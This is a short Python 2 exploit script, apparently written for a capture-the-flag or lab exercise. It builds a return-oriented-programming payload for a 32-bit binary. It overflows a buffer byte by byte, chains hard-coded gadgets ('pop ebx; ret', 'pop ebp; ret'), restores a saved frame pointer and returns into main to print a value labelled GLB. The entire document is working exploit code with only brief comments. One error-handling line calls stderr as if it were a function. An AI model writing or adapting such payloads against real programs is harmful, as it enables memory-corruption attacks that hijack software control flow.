#! /usr/bin/python2
from sys import stdout, stderr

stdout.write("Foo Bar Baz\x00\n")  # To be read into `plaintext`

# Note payload cannot contain ord("\n")

# Print the value of GLB using main.
payload = [0x00000000] * 6 + [
    0x080b2643,  # pop ebx; ret;
    0x80e5000,  # $ebx at start of concatenate strings
    0x08049859,  # pop ebp; ret;
    0xffffd018,  # original ebp
    0x08049eb7,  # the return address in main
    # 0x8049eb7,  # the return address in main
    # 0x08049efc,  # the address before the final call to printf in main
]

#            &i   - &buffer
len_buffer = 0x28 - 0x1c

# Write our required return address and data to the stack
byte_mask = (0b1 << 8) - 1
i = 0
for word in payload:
    assert (word >> 32) == 0  # 4 byte address
    for j in range(4):
        byte = word & byte_mask
        if byte == ord("\n"):
            stderr("Cannot write 0x0a to the stack (i.e. a newline), change value number ", i)
        if not (i == len(payload) - 1 and j == 3):
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x00\x00\x00")
        else:
            stdout.write(chr(byte) + "B" * (len_buffer - 1) + "\x09\x00\x00")
        word >>= 8
    i += 1

stdout.flush()
